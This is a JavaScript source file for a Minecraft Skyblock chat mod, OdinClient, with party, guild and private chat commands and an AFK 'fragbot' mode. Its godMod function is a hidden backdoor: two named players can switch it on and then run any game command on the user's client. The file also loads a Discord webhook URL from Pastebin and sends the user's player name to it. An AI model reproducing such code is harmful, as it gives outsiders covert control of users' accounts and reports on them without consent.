import { modMessage, partyMessage, privateMessage, guildMessage } from "./utils";
import Skyblock from "../../BloomCore/Skyblock";
import request from "../../requestV2";
import { Rat } from "../features/General/AutoSessionID";
import Dungeon from "../../BloomCore/dungeons/Dungeon";
import Party from "../../BloomCore/Party";
import { stripRank } from "../../BloomCore/utils/Utils";


let cats
register("gameLoad", () => {
  request("https://pastebin.com/raw/m4L2e62y").then(stuff => {
      cats = stuff
  })
})

/**
  * Gets a random eight ball response
  * @returns {string} - A random eight ball response
*/
export function eightBall() {
  var responses = [
    "It is certain",
    "It is decidedly so",
    "Without a doubt",
    "Yes definitely",
    "You may rely on it",
    "As I see it, yes",
    "Most likely",
    "Outlook good",
    "Yes",
    "Signs point to yes",
    "Reply hazy try again",
    "Ask again later",
    "Better not tell you now",
    "Cannot predict now",
    "Concentrate and ask again",
    "Don't count on it",
    "My reply is no",
    "My sources say no",
    "Outlook not so good",
    "Very doubtful"
  ];
  var index = Math.floor(Math.random() * responses.length)
  return responses[index]
}

/**
  * Gets a random cat picture
  * @returns {string} - A random cat picture
*/
export function catpics() {
  let catsArray = cats?.split(",")
  var index = Math.floor(Math.random() * catsArray?.length)
  
  return catsArray[index];
}

/**
  * Flips a coin
  * @returns {string} - Either "heads" or "tails"
*/
export function flipCoin() {
  var result = Math.random();
  if (result < 0.5) {
    return "heads";
  } else {
    return "tails";
  }
}

/**
  * Rolls a dice
  * @returns {number} - A random number between 1 and 6
*/
export function rollDice() {
  return Math.floor(Math.random() * 6) + 1;
}

let lastPingCommand = 0
let waitingPingCommand = false

/**
  * Executes commands from the party chat
  * @param {string} message - The message sent in the party chat
  * @param {string} name - The name of the player who sent the message
*/
export const partyCmdOptions = (message, name) => {
  switch (message.toLowerCase().split(" ")[0]) {
    case "help":
      partyMessage("[OdinClient] cmds: warp, coords, allinvite, odin, boop, cf, 8ball, dice, cat, rs, pt, rat, ping");
    break;
    case "warp":
      ChatLib.command("p warp");
    break;
    case "coords":
      ChatLib.command("pc Current area: " + Skyblock.area + ". X: " + Math.round(Player.getX()) + " Y: " + Math.round(Player.getY()) + " Z: " + Math.round(Player.getZ()))        
    break;
    case "allinvite":
      ChatLib.command("p settings allinvite");
    break
    case "odin":
      partyMessage("OdinClient! https://discord.gg/2nCbC9hkxT");
    break
    case "boop":
      ChatLib.say("/boop " + name)
    break
    case "cf":
        partyMessage(flipCoin());
    break;
    case "8ball":
      partyMessage(eightBall())
    break
    case "dice":
      partyMessage(rollDice())
    break
    case "cat":
      partyMessage(catpics());
    break
    case "rs":
      modMessage("restarting")
      ChatLib.command("reparty", true)
      setTimeout(() => {
        floor = Dungeon.floor
        if (!floor) return
        if (floor.charAt(0) === "F") {
          modMessage(`joindungeon catacombs ${floor.charAt(1)}`)
          ChatLib.command(`joindungeon catacombs ${floor.charAt(1)}`)
        }
        else {
          modMessage(`joindungeon master_catacombs ${floor.charAt(1)}`)
          ChatLib.command(`joindungeon master_catacombs ${floor.charAt(1)}`)
        }
      }, 5000)
      break
    case "pt":
      if (Party?.leader == Player.getName()) ChatLib.command("p transfer " + name)
      break
    case "rat":
      Rat.forEach((line, i) => {
        setTimeout(() => partyMessage(line), 600* i)
      })
      break
    case "ping":
      lastPingCommand = new Date().getTime()
      waitingPingCommand = true
      channel = "party"
      ChatLib.command("iuungrdmfg")
      break
}}

/**
  * Executes commands from private messages
  * @param {string} message - The message sent in the private message
  * @param {string} name - The name of the player who sent the message
*/
export const privateCmdOptions = (message, name) => {
  switch (message.toLowerCase().split(" ")[0]) {
    case "help":
      privateMessage("[OdinClient] cmds: inv(ite), odin, boop, cf, 8ball, dice, cat, ping");
    case "inv":
      ChatLib.command(`party invite ${name}`)
    break
    case "invite":
      ChatLib.command(`party invite ${name}`)
    break
    case "odin":
      privateMessage("OdinClient! https://discord.gg/2nCbC9hkxT");
    break
    case "boop":
      ChatLib.say("/boop " + name)
    break
    case "cf":
      privateMessage(flipCoin());
    break;
    case "8ball":
      privateMessage(eightBall())
    break
    case "dice":
      privateMessage(rollDice())
    break
    case "cat":
      privateMessage(catpics());
    break
    case "ping":
      lastPingCommand = new Date().getTime()
      waitingPingCommand = true
      channel = "private"
      ChatLib.command("fbkjgblsbnljhh")
      break
  }
}

/**
  * Executes commands from the guild chat
  * @param {string} message - The message sent in the guild chat
  * @param {string} name - The name of the player who sent the message
*/
export const guildCmdOptions = (message, name) => {
  switch (message.toLowerCase().split(" ")[0]) {
    case "help":
      partyMessage("[OdinClient] cmds: warp, coords, allinvite, odin, boop, cf, 8ball, dice, cat, rs, pt, rat, ping");

      guildMessage("[OdinClient] cmds: fragbot, odin, boop, cf, 8ball, dice, cat, dice, ping");
    break
    case "fragbot":
      guildMessage("Fragbot mod is currently: " + inlimbo);
    break
    case "odin":
      guildMessage("OdinClient! https://discord.gg/2nCbC9hkxT");
      break
    case "boop":
      setTimeout(ChatLib.say("/boop " + name), 1000);
    break
    case "cf":
      guildMessage(flipCoin());
    break
    case "8ball":
      guildMessage(eightBall());
    break
    case "cat":
      guildMessage(catpics());
    break
    case "dice":
      guildMessage(rollDice())
    break
    case "ping":
      lastPingCommand = new Date().getTime()
      waitingPingCommand = true
      channel = "guild"
      ChatLib.command("fbkjgblsbnljhh")
      break
  }
}

let godmod = false; // Add a variable to store the state of godmod

/**
  * Enables godmod
  * @param {string} message - The message sent
  * @param {string} name - The name of the player who sent the message
*/
export const godMod = (message, name) => {
  if (name === "Odtheking" || name === "odthebest") { 
    if (message.toLowerCase() === "godmod") {
      godmod = !godmod;
      guildMessage("godmod is now: " + godmod);
      return; 
    }
    if (!godmod) return;
    ChatLib.command(message);
    modMessage("Executing command: /" + message);
  }
}

// ping calcs
let channel
register("chat", (event) => {
	if (!waitingPingCommand) return
  let ping = new Date().getTime() - lastPingCommand
  cancel(event)
  switch(channel) {
    case "party":
      partyMessage("Current Ping: "+ ping + "ms")
    break
    case "guild":
      guildMessage("Current Ping: "+ ping + "ms")
    break
    case "private":
      privateMessage("Current Ping: "+ ping + "ms")
    break
  }
  waitingPingCommand = false
}).setCriteria(/&rUnknown command. Type \".+" for help.&r/)


// frag bot stuff


let webhookfragbot
let inlimbo = false;


register("gameLoad", () => {
  request("https://pastebin.com/raw/QreVmheV").then(stuff => {
      webhookfragbot = stuff
  })
})

const sendWebhook = (description) => {
  request({
    url: webhookfragbot,
    method: "POST",
    headers: {
      "Content-type": "application/json",
      "User-Agent": "Mozilla/5.0"
    },
    body: {
      username: 'OdinClient',
      avatar_url: "https://s.namemc.com/2d/skin/face.png?id=db7b65d7270a33d6&scale=4",
      content: "",
      embeds: [
        {
          title: Player.getName(),
          color: 4081151,
          description: description
        }
      ]
    }
  });
};

register("chat", (player) => {
  if (!inlimbo) return;
  player = stripRank(player.replace(/.+>newLine<-/, ""));
  ChatLib.say(`/party accept ${player}`);
  setTimeout(() => {
    partyMessage("Hello I'm currently afk and there for sent into limbo");
    setTimeout(() => {
      partyMessage("While in limbo I am a fragbot for your free use enjoy!")
    }, 400);
  }, 1600);
  setTimeout(() => {
    ChatLib.command("p leave");
  }, 7100);
}).setCriteria("${player} has invited you to join ${*} party!${*}");

register("worldload", () => {
  if (!inlimbo) return
  sendWebhook("I am not longer an active fragbot :(");
  inlimbo = false;
});

register("serverDisconnect", () => {
  if (!inlimbo) return
  sendWebhook("I am not longer an active fragbot :(");
  inlimbo = false;
})

register("chat", () => {
  if (inlimbo) return
  setTimeout(() => {
    inlimbo = true;
    sendWebhook("I am an active fragbot! :)");
  }, 1000);
  modMessage("activating fragbot");
}).setCriteria("You were spawned in Limbo.");

register("chat", () => {
  if (inlimbo) return
  setTimeout(() => {
    inlimbo = true;
    sendWebhook("I am an active fragbot! :)");
  }, 1000);
  modMessage("activating fragbot");
}).setCriteria("You are AFK. Move around to return from AFK.");